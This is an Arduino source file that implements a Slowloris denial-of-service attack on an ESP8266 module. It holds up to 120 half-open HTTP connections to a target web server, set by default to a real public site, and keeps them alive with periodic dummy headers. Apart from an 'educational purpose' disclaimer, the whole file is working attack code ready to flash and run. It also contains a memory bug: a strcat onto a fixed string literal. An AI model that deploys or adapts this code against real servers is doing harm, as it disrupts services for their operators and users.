/*
* Author: Sergio Garcia Lopez
* GitHub: https://github.com/SergiDelta/SlowLoris
* Date: February 2021
* Description: Simple slowloris
*   DOS implementation on a
*   ESP8266 module inspired on
*   Computerphile's slowloris.py 
*   Tested socket limit is 120
*   
* DISCLAMER:
*   Please, use this code only for
*   educational purpose. I am not 
*   resposible for any malicious
*   use of it. 
*/

#include <ESP8266WiFi.h>

#define STASSID "your-ssid"
#define STAPSK  "your-password"

#define HEAD_LIST_SIZE 3

#define DELAY 7500

const char* ssid     = STASSID;
const char* password = STAPSK;

const char* host = "www.google.com";

/*  
 *   Use IPAddress if you want
 *   to attack a specific ip address. 
 *   Example:
 *   
 *   IPAddress host(192,168,1,1);
 */

const int port = 80;
const int socket_count = 120;
int removed_socks = 0;

WiFiClient socket_list[socket_count];

char* host_header = "Host: ";
char* regular_headers[HEAD_LIST_SIZE];

void setup() {

  randomSeed(analogRead(0));

  strcat(host_header, host);
  regular_headers[0] = host_header;
  regular_headers[1] = "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0";
  regular_headers[2] = "Accept-language: en-US,en,q=0.5";

  Serial.begin(115200);

  // Connecting to Wifi network
  Serial.print("\n\nConnecting to ");
  Serial.println(ssid);

  // Wifi client mode
  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid, password);

  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }

  Serial.print("\nWiFi connected.");
  Serial.print(" IP address: ");
  Serial.println(WiFi.localIP());

  Serial.print("\nAttacking ");
  Serial.print(host);
  Serial.print(" with ");
  Serial.print(socket_count);
  Serial.println(" sockets");

  Serial.println("Creating sockets...");

  for (int i = 0; i < socket_count; i++) {
      Serial.print("Creating socket number ");
      Serial.println(i + 1);
      init_socket(i);
  }

}

void loop() {

  Serial.print("Sending keep-alive headers... Socket count: ");
  Serial.println(socket_count - removed_socks);
  for (int i = 0; i < socket_count; i++) {

    if (socket_list[i]) {
      int num = random(1, 5000);
      socket_list[i].print("X-a: " + String(num) + "\r\n");
    }
  }

  fill_sock_list();

  delay(DELAY);
  
}

void init_socket(int sock_num) {

  WiFiClient sock;
  
  if (!sock.connect(host, port)) {
    Serial.println("connection failed");
    removed_socks++;
    
    return;
  }

  sock.print("GET / HTTP/1.1\r\n");

  for (int i = 0; i < HEAD_LIST_SIZE; i++) {
    sock.print(String(regular_headers[i]) + "\r\n");
  }

  socket_list[sock_num] = sock;
  
  return;
}

void fill_sock_list() {

  for (int i = 0; i < socket_count; i++) {

    if (!socket_list[i]) {
      Serial.println("Recreating socket...");
      init_socket(i);

      if (socket_list[i]) {
        removed_socks--;
      }
    }
  }
}
